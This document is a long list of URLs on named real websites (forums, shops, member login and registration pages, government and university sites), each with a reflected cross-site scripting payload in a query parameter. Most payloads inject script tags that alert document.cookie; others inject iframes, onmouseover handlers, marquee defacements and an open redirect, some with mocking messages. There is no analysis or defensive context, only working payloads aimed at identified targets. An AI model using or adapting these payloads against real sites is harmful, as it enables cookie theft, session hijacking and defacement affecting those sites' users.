-http://www.healthline.com/search?q1=%27%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%27%3balert<br>(string.fromcharcode(88%2c83%2c83))%2f%2f%22%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%22%3b<br>alert(string.fromcharcode(88%2c83%2c83))%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88%2c83%2c83))%3c%2fscript%3e
-http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;
-http://www.layeredgfx.com/forums/tag-signature-tutorials/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;
-http://www.puremarketprofits.com/f233/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;
-http://www.pc101.com/forum/f32/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://search.lifespan.org/search?p=q&amp;ts=custom&amp;s_2=1&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0
-http://www.shortnews.com/feedback.cfm?fanz=1&amp;fbid=408632&amp;rubrik=testicles&quot;&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;&amp;start=1
-http://www.enjoycg.com/forums/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://storage.organizeit.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;restricted=mt_restricted_organizesit
-http://search.folica.com/search?p=q&amp;ts=custom&amp;isort=score&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0
-http://qantas.resultspage.com.au/search?p=q&amp;ts=custom&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0
-http://search.dse.com.au/search?sessionid=4859ae4304748b06273fc0a87f9c06c8&amp;w=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=go
-http://ccc.resultspage.com/search?s_2=1&amp;s_3=1&amp;ts=custom&amp;p=q&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;<br>y=0
-http://search.cableorganizer.com/search?w=%3c/script%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e%3cscript%3e//%20&amp;view=list&amp;prodsearch.x=0&amp;prodsearch.y=0&amp;prodsearch=go
-http://search.ulta.com/search?userid=guest&amp;w=%22%3e%3cscript%3ealert(%2fhacker+safe+my+ass%2f)%3b%3c<br>%2fscript%3e&amp;x=0&amp;y=0
-http://replay.tickets.com/buy/myticketsservlet?orgid=testicles&quot;&gt;&lt;script&gt;alert(document.cokie);&lt;/scri<br>pt&gt;
-http://aquaticeco.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://americanbridal.resultspage.com/search?ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://www.miglioman.altervista.org/prova/index.php?site=forum_topic&amp;topic=1&amp;type=asc&amp;page=%22%3e%3c<br>/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e%3c!--
-http://siam99.servepics.com/webpic/list.php?id=1&amp;page=1&amp;pic=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;
-http://forums.wingchun.com.au/academy/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;
-http://www.cashloopholes.co.uk/gambling-loopholes-secrets/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/mar<br>quee&gt;
-http://www.cableforum.co.uk/board/10/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.politikstube.de/forum/vorstellungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;
-http://www.dhforo.com/bienvenidas/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.developer-network.org/suggestions-feedback/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;
-http://www.esportboard.de/forum/ankuendigungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;
-http://www.exasco.info/forum/depression/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.dieselhaulin.com/forums/introduce-yourself/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee<br>&gt;
-http://www.caraudiojunkyard.com/forum/car-audio-junkyard/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;
-http://www.blutschwerter.de/f17-b-news/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.gimnasio.ws/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.mymodeltalk.com/jobs/modeling-acting-auditions-new-york-new-jersey/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;sc<br>ript&gt;alert(document.cookie);&lt;/script&gt;
-http://www.shellcash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.owensclickplace.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e
-http://thedragonsgold.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.thetwodivasgpt.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.girlsbazaar.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://cashtroops.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.hitmanslife.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.decayofcamelot.com/register.php?ref=%27%3e%3ciframe+src=http://google.com%3e
-http://www.troubledstreets.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.mystablemates.co.uk/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.leprechaunsloot.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e
-http://www.mafiachaos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.gptoffers.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://milkywayclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.colossal-cash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://viva-ponata.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.intoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e
-http://www.riseofterror.com/register.php?ref=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://pocketchangegpt.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.race4clicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.grandtheftmastermind.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.piratequests.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.starreferrals.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.hostile-city.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.squishycash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.jillsclickcorner.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e
-http://ozgonewild.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://firehouseoffers.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://firehouseoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e
-http://piratesriches.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e
-http://www.mafia3000.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.bowlingforcash.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e
-http://www.gptcashcow.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e
-http://www.dazzleindough.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e
-http://www.myepisodes.com/login.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://ready-up.com/main/community/f6/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;pappy_was_here&lt;/marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3e
-http://www.stop-sign.com/se/se332b.php?pg=%22%3e%3c/a%3etesticles&amp;ver=%22%3e%3c/a%3etesticles&amp;n=%22%<br>3e%3c/a%3etesticles&amp;uid=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e&amp;bit_mask=0&amp;bi<br>t_sample=780508868&amp;sv=mss_spin_mss_spin
-http://freebiesjunction.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://investors.cray.com/phoenix.zhtml?c=98390&amp;p=irol-newsarticle&amp;id=1136684&amp;highlight=%22%3etestic<br>les%3c/a%3etest%3cmarquee%3epappy was here%3c/marquee%3e
-http://www.kinkom.by/search.php?cat=&amp;query=%3cscript%3ealert(document.cookie);%3c/script%3e
-http://dailytimesuck.com/search.php?search=%22%3e%3ciframe+src=http://google.com?&amp;searchelement=both
-http://www.themotorhouse.co.uk/register/?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://bankrollbucks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.thedjlist.com/login.php?scen=a%3a1%3a{i%3a0%3bi%3a75%3b}&amp;ref='&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;
-http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&amp;recordsperpage=25&amp;name_flag<br>=&amp;from_search=true&amp;jobcat=&amp;industry=22&amp;seniority=&amp;frmpositioncountry=&amp;pastdate=&amp;from_possearch=&amp;pos_<br>ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.wehire.ca/personal.php?action=new&amp;auth_sess=e757d8719f17c4c88c41344fc1107ef6&amp;ref=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie);&lt;/script&gt;
-http://www.jobgeo.com/personal.php?action=new&amp;auth_sess=&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;
-http://r.espn.go.com/espn/preferences/passivelogin?appredirect=http://google.com
-http://www.commonsensemedia.org/user/register.php?fwd=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.seven-bux.com/index.php?view=login&amp;ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.mycricket.com/cricketsupport/faqs/details?id=529&amp;fromsearch=%22%3e%3c/a%3e%3cscript%3eale<br>rt(/hacker%20safe%20my%20ass/);%3c/script%3e
-http://www.4x4mecca.com/forum/tech-tuesdays/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;
-http://www.directory.wiredawg.net/index.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://visitlasvegas.com/vegas/my-vegas/login.jsp?email=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www2.fuse.tv/login.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www2.fuse.tv/search.php?searchstring=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0
-http://usa.kaspersky.com/trials/trialsreg.php?aw=trials+page&amp;ref=&quot;&gt;&lt;script&gt;alert(&quot;so anti-virus cant<br>secure their pages?&quot;);&lt;/script&gt;&amp;chapter=146538207
-http://www.cash2grab.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.globalcashclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.eetimes.com/techsearch/not_found.jhtml;jsessionid=fpyiswcussjkqqsndlpckh0cjunn2jvn?nftype<br>=empty&amp;querytext=%22%3b+alert%28document.cookie%29%3b%2f%2f&amp;site_id=ee+times&amp;_requestid=212632
-http://www.5centminimum.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.ticketcenter.com/sendpage/friend.php?id=&quot;&gt;&lt;marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3esome concert tickets&lt;/marquee&gt;
-http://www.hexar.net/viewfile.php?/&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.mlgpro.com/?q=node/219283&amp;page=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;query=node/<br>219283
-http://wow.maxvellnos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.wiredawg.net/mail.asp?source=locator&amp;personid=2757&amp;name=&lt;script&gt;alert(document.cookie);&lt;/<br>script&gt;
-http://www.localschooldirectory.com/include/information/az/category_2/aims_chart.php?district_page=y<br>&amp;state_page=y&amp;subject=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;grade=grade
-http://api.msappspace.com/proxy/relay.proxy?opensocial_authtype=signed&amp;opensocial_token=at4ijkeddpnl<br>kau5f/gsmgfqlodup0edptea45xouklxsvujcvgcams+blrbo8m3617chfi29vffwitjqsbfr3rlryrivuzjlk2v2b+fcua=&amp;ope<br>nsocial_url=http://xssed.com
-http://www.centralchat.net/chatrooms/cgiirc.php?c=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.totalbeauty.com/index.php?swords=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0&amp;id=51<br>&amp;no_cache=1
-http://hotlists.hotornot.com/style-g961172-heroes.html?rid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;
-http://hotlists.hotornot.com/?state=embed&amp;wid=nlosgzel&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;aut<br>htoken=undefined&amp;username=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://hotlists.hotornot.com/?state=browse&amp;tag=boobs&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.universalcriminal.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;
-http://www.warriorsreign.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.torn-county.net/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.haunted-horrors.com/register2.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.downtown-to.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.video-game-rpg.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://suburban-assault.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;
-http://www.daysofprohibition.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.brokencriminals.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://trapped-in-paradise.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.criminaldevastation.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://corruptedcity.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.bogansandbitches.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.unholystate.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.pimpstreetwars.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://la-familia.nl/register.php?ref=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.ultimateoutdoorz.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://wanted-criminals.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://scoreboards.hotornot.com/?groupname=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-https://www.earthlyendeavours.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.tropicalterror.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.rapid-city.blackheartworks.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;
-http://www.starfleetz.com/login.php?case=register&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.stompville.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;
-http://www.gangengagement.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://content.sos.state.ga.us/cdm4/results.php?cisoop1=all&amp;cisofield1=cisosearchall&amp;cisorestmp=resu<br>lts.php&amp;cisoviewtmp=item_viewer.php&amp;cisomode=grid&amp;cisogrid=thumbnail%2ca%2c1%3btitle%2ca%2c1%3brelat<br>i%2ca%2c0%3bdate%2c200%2c0%3bnone%2ca%2c0%3b20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisobib=title%2<br>ca%2c1%2cn%3brelati%2ca%2c0%2cn%3bdate%2c200%2c0%2cn%3bnone%2ca%2c0%2cn%3bnone%2ca%2c0%2cn%3b20%3bti<br>tle%2crelati%2cdate%2cnone%2cnone&amp;cisothumb=20+%284x5%29%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisot<br>itle=20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cisohiera=20%3btitle%2crelati%2cdate%2cnone%2cnone&amp;cis<br>osuppress=1&amp;cisobox1=%3cscript%3ealert%281%29%3b%3c%2fscript%3e&amp;cisoroot=all
-http://www.dmva.state.co.us/search.php?search=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://zazachat.zazasoftware.com/livechatclient/livechatvisitor.aspx?zzwindow=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie);&lt;/script&gt;&amp;zazac=8007
-http://catalyst.ogb.state.ms.us/search.php?form_props%5bcounty%5d=&amp;form_props%5bfield%5d=&amp;form_props<br>%5btownship%5d=&amp;form_props%5bsection%5d=&amp;form_props%5brange%5d=&amp;form_props%5boperator%5d=&amp;form_props<br>%5bapi%5d=%3cscript%3ealert%281%29%3b%3c%2fscript%3e&amp;form_props%5bform_type%5d=&amp;mode=2&amp;start=0
-http://digitum.washingtonhistory.org/cdm4/results.php?cisoop1=all&amp;cisobox1=%3cimg%20src%3d%22%22%20o<br>nerror%3d%22alert(1)%3b%22%3e&amp;cisofield1=cisosearchall&amp;cisoop2=exact&amp;cisobox2=&amp;cisofield2=cisosearch<br>all&amp;cisoop3=any&amp;cisobox3=&amp;cisofield3=cisosearchall&amp;cisoop4=none&amp;cisobox4=&amp;cisofield4=cisosearchall&amp;c<br>isoroot=all,/curtis,/genphotos,/art,/basket,/manuscripts,/indian,/columbia,/stevens,/lcexpedition,/s<br>ohon,/maps,/ephemera,/artifacts,/archaeology,/boland,/wehn,/music,/womens&amp;t=a
-https://auth.station.sony.com/login?service=&quot;;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;https%3a%2f%2faccou<br>nt.station.sony.com%2fj_acegi_cas_security_check&amp;theme=uramweb&amp;locale=en_us
-http://f.uck-you.com/?who=%3ciframe%20src=http://google.com%3e
-http://www.geschenkidee.ch/de/searchresults.html?q=&lt;/title&gt;&quot;;&lt;/script&gt;&lt;script&gt;alert(document.cookie)<br>;&lt;/script&gt;&lt;script&gt;test=&quot;1
-http://www.wizardofozcostumes.com/search.asp?q=&lt;/title&gt;&lt;script&gt;alert('hacker safe my ass');&lt;/script&gt;
-http://www.realizeband.com/dtcf/components/seminar-finder/result?frommini=true&amp;zip=&quot;&gt;&lt;script&gt;alert(d<br>ocument.cookie);&lt;/script&gt;&amp;submit.x=0&amp;submit.y=0
-http://www.realizeband.com/dtcf/components/search/result?freshsearch=true&amp;q=&quot;&gt;&lt;script&gt;alert(document<br>.cookie);&lt;/script&gt;&amp;x=0&amp;y=0
-http://mediacorptv.sg/login.aspx?lang=en&amp;returnurl=%27%20onmouseover=%27alert(document.cookie);%27
-http://www.santorographics.com/tutticuti/diary/?lang=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;day_id=2008082<br>1
-http://fido.ca/web/content/planpromo/promo_q308_morebark&amp;lang=%22;%20alert(1);%20//
-http://etisalat.ae/index.jsp?q=blackberry&amp;go=+&amp;lang=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;type=search
-http://www.mobwarz.net/signup.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://gw2.geneanet.org/index.php3?b=kempfmann&amp;lang=en;pz=joshua+daniel;nz=black;ocz=0;p=nancy+davis<br>;n=&lt;iframe src=http://google.com&gt;
-http://www.wikio.co.uk/search/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.anaivanovic.com/?path=tell_a_friend&amp;detailpage=1262&amp;lang=en&amp;link=&quot;&gt;&lt;script&gt;alert('pappy<br>says your hot!');&lt;/script&gt;
-http://bulletin.mmu.edu.my/v3/view/bulletin_main.mmu?s=54988&amp;by=--%3e%3c/a%3e%3cscript%3ealert(1);%3<br>c/script%3e
-http://www.mtldnb.com/index.php?name=forums&amp;file=search&amp;search_author=&quot;&gt;&lt;/option&gt;&lt;script&gt;alert(docum<br>ent.cookie);&lt;/script&gt;
-http://www.pornograb.com/index.php?st=1&amp;num=25&amp;new=1&amp;q=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;&amp;stype=vid&amp;sort=date&amp;vtype=&amp;button=find
-http://www.owensworld.com/search/?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://meetme.hotornot.com/?5570=21872&amp;vt=32&amp;state=vote&amp;vote=yes&amp;votee=&quot;&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;&lt;marquee&gt;pappy was here&lt;/marquee&gt;
-http://www.mrstiff.com/?query=%3c%2ftitle%3e%3cscript%3ealert(document.cookie)%3b%3c%2fscript%3e&amp;act<br>ion=search&amp;page=search&amp;do_directory=true&amp;do_galleries=true&amp;do_pictures=true&amp;do_movies=true&amp;orderby=r<br>elevance&amp;searchmethod=strict&amp;extraform=active
-http://www.hotornot.com/popup/share.html?eid=nqelheg&amp;key=xaq&amp;source=&gt;&lt;script&gt;alert(document.cookie);<br>&lt;/script&gt;
-http://soulxchange.us/index.php?refid=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.cafemom.com/login.php?successurl=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.sbf2-elite.dhhscomputing.com/register.php?ref=%27%3e%0a%3cmarquee%3etesticles%20was%20her<br>e%3c/marquee%3e
-http://www.lebanonfiles.com/calendar.php?id=6&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.baynews9.com/search.cfm?search=&quot; onmouseover=&quot;alert(1);&quot; &amp;submit.x=0&amp;submit.y=0
-http://www.seventhsanctum.com/generate.php?genname=%22%3e%3c/a%3e%3cscript%3ealert(1);%3c/script%3e
-http://seenonstyle.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.co<br>okie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://nbcsports.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://streetlimitz.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.ixda.org/search.php?tag=%27%3e%3c%2ftitle%3e%3cscript%3ealert%28document.cookie%29%3b%3c%<br>2fscript%3e
-http://www.100pour100parfum.com/register.php?marraine=%22%3e%3ciframe+src=http://google.com%3e
-http://nrsweb.resultspage.com/display.php?p=q&amp;ts=custom&amp;w=%22)%3balert(document.cookie)%3b%2f%2f
-http://digitaleyes.resultspage.com/search?p=q&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0
-https://fungalgenomics.concordia.ca/feadb/genesearch.php?allspecies=%3cscript%3ealert(document.cooki<br>e);%3c/script%3e%2bares%2bapul%2bccin%2bclau%2bcele%2bgpan%2bgtra%2bledo%2blsco%2bopil%2bpchr%2bsthe<br>%2btlan%2btver&amp;sel_species%5b%5d=all&amp;gene_name=%22%3etesticles&amp;submit1=search#tlan
-http://photo.bees.net/gallery/search.php?searchstring=%3cscript%3ealert(document.cookie);%3c/script%<br>3e
-http://www.vbseo.com/f5/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://stoptazmo.com/announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.danndivine.com/index.php?target=products&amp;mode=search&amp;subcats=y&amp;type=extended&amp;avail=y&amp;psho<br>rt=y&amp;pfull=y&amp;pname=y&amp;pkeywords=y&amp;cid=0&amp;q=%22+onmouseover%3d%22alert%28document.cookie%29+
-http://kino.uz/search/?key=%22%3etesticles%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e
-http://www.agio-shop.com/index.php?goo=goods_search_list.dwt&amp;gcat=0&amp;gkey=&quot;&gt;&lt;iframe<br>src=http://google.com&gt;&lt;/iframe&gt;&amp;image.x=0&amp;image.y=0
-http://right-move.co.uk/index.php?keywords=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;iframe src=http://google.com&gt;&lt;/iframe&gt;
-http://www.theshiznit.co.uk/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.spawnfusion.net/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.spaarparadijs.info/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://zakonsmoka.pl/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.vtlanguedoc.com/register.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.penguinpartycash.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://hittoad.com/register.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://khazbanar.net/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.therialto.com/main.php?title=now_showing_movies&amp;&amp;theater=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.soulsaver.hr/main.php?dom=default&amp;url=javascript:alert(1);
-http://www.poststoriches.com/register.php?ref='&gt;&lt;iframe src=http://google.com&gt;
-http://www.csd.uoc.gr/~milios/main/php/title.php?page=&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.muzeumgazownictwa.pl/main.php?title=1%22%3e%3c/embed%3e%3cscript%3ealert(1);%3c/script%3e
-http://www.moviemags.com/main.php?title=&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.miniatuurbussen.nl/main.php?title=&lt;script&gt;alert(1);&lt;/script&gt;&amp;url=http://google.com?&quot;&gt;&lt;/if<br>rame&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--
